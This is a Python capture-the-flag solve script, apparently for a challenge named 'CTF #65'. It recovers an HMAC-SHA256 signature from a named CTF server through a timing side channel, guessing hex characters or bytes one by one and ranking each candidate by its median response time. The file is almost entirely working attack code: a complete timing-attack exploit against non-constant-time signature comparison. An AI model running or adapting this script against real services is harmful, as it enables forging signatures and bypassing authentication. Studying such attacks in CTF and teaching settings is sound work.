#!/usr/bin/env python3
"""
CTF #65 - Timing Attack on HMAC
Exploits byte-by-byte comparison timing leak to recover the HMAC signature.

Usage: python ctf65_solve.py
"""

import requests
import time
import statistics
import sys

URL = "http://paris.hackdevinci.com:8065/"
HEX_CHARS = "0123456789abcdef"
SIG_LEN = 64  # HMAC-SHA256 = 32 bytes = 64 hex chars
SAMPLES = 31  # odd number for clean median
ROUNDS = 3    # number of full rounds per position to confirm


def try_sig(session, sig_hex):
    """Send a signature and return response time."""
    start = time.perf_counter()
    r = session.post(URL, data={"sig": sig_hex}, timeout=15)
    elapsed = time.perf_counter() - start
    return elapsed, r.text


def find_byte(session, known, position):
    """Find the next byte (2 hex chars) at the given position using timing."""
    timings = {}

    for hi in HEX_CHARS:
        for lo in HEX_CHARS:
            byte_hex = hi + lo
            candidate = known + byte_hex
            # Pad remaining with zeros
            padded = candidate.ljust(SIG_LEN, '0')

            times = []
            for _ in range(SAMPLES):
                elapsed, text = try_sig(session, padded)
                # Check for success
                if "Correct" in text or "flag" in text.lower() or "MUSIC" in text:
                    print(f"\n[!!!] FLAG FOUND with sig: {padded}")
                    print(text)
                    return byte_hex, True
                times.append(elapsed)

            med = statistics.median(times)
            timings[byte_hex] = med

    # Rank by timing (highest = most bytes matched = correct)
    ranked = sorted(timings.items(), key=lambda x: x[1], reverse=True)
    best = ranked[0]
    second = ranked[1]
    ratio = best[1] / second[1] if second[1] > 0 else 0

    print(f"  Byte {position:2d}: 0x{best[0]} ({best[1]*1000:.1f}ms, "
          f"ratio={ratio:.3f}) | top5: {[(b, f'{t*1000:.1f}ms') for b, t in ranked[:5]]}")

    return best[0], False


def find_char(session, known, position):
    """Find the next single hex char at the given position using timing."""
    timings = {}

    for c in HEX_CHARS:
        candidate = known + c
        padded = candidate.ljust(SIG_LEN, '0')

        times = []
        for _ in range(SAMPLES):
            elapsed, text = try_sig(session, padded)
            if "Correct" in text or "flag" in text.lower() or "MUSIC" in text:
                print(f"\n[!!!] FLAG FOUND with sig: {padded}")
                print(text)
                return c, True
            times.append(elapsed)

        med = statistics.median(times)
        timings[c] = med

    ranked = sorted(timings.items(), key=lambda x: x[1], reverse=True)
    best = ranked[0]
    second = ranked[1]
    ratio = best[1] / second[1] if second[1] > 0 else 0

    print(f"  Pos {position:2d}: '{best[0]}' ({best[1]*1000:.1f}ms, "
          f"ratio={ratio:.3f}) | top5: {[(c, f'{t*1000:.1f}ms') for c, t in ranked[:5]]}")

    return best[0], False


def main():
    mode = "char"  # "char" = 1 hex char at a time, "byte" = 2 hex chars (byte)
    known = ""

    if len(sys.argv) > 1:
        known = sys.argv[1]
        print(f"[*] Resuming from: '{known}' (pos {len(known)})")

    if len(sys.argv) > 2:
        mode = sys.argv[2]

    session = requests.Session()

    # Quick baseline test
    print("[*] CTF #65 - HMAC Timing Attack")
    print(f"[*] Target: {URL}")
    print(f"[*] Mode: {mode} | Samples: {SAMPLES}")

    # Test connectivity
    elapsed, text = try_sig(session, "0" * SIG_LEN)
    print(f"[*] Baseline: {elapsed*1000:.1f}ms")
    if "Invalid" in text:
        print("[*] Server responding correctly. Starting attack...\n")
    else:
        print(f"[!] Unexpected response: {text[:200]}")
        return

    if mode == "byte":
        # 2 hex chars at a time (faster but needs bigger timing diff)
        for i in range(len(known) // 2, SIG_LEN // 2):
            byte_hex, found_flag = find_byte(session, known, i)
            if found_flag:
                return
            known += byte_hex
            print(f"       => {known}")
    else:
        # 1 hex char at a time (more reliable)
        for i in range(len(known), SIG_LEN):
            char, found_flag = find_char(session, known, i)
            if found_flag:
                return
            known += char
            print(f"       => {known}")
            sys.stdout.flush()

    # Final verification
    print(f"\n[+] Extracted signature: {known}")
    print("[*] Final verification...")
    _, text = try_sig(session, known)
    print(text)


if __name__ == "__main__":
    main()
